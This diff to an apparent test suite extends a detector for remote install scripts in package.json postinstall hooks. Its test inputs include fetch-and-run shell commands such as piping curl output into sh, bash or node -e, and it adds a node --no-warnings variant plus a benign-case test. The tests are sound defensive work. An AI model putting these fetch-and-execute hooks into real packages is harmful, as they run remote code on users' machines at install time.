@@ -24,6 +24,7 @@ describe("DependencyDetector remote install scripts", () => {
       'sh -c "$(curl -fsSL https://example.com/i.sh)"',
       "bash <(curl -s https://example.com/i.sh)",
       'node -e "$(curl -s https://example.com/i.js)"',
+      'node --no-warnings -e "$(curl -s https://example.com/i.js)"',
       "npx -y https://example.com/tool.tgz",
     ]) {
       const [f] = await scan({ private: true, scripts: { postinstall: cmd } });
@@ -67,6 +68,13 @@ describe("DependencyDetector command substitution as data", () => {
       scripts: {
         postinstall: 'node scripts/setup.js --latest "$(curl -s https://api.example.com/version)"',
       },
+    });
+    expect(fs.every((f) => f.severity !== "critical")).toBe(true);
+  });
+
+  it("does not treat a script's own -c flag as the interpreter's", async () => {
+    const fs = await scan({
+      scripts: { postinstall: 'node scripts/build.js -c "$(curl -s https://api.example.com/cfg)"' },
     });
     expect(fs.every((f) => f.severity !== "critical")).toBe(true);
   });
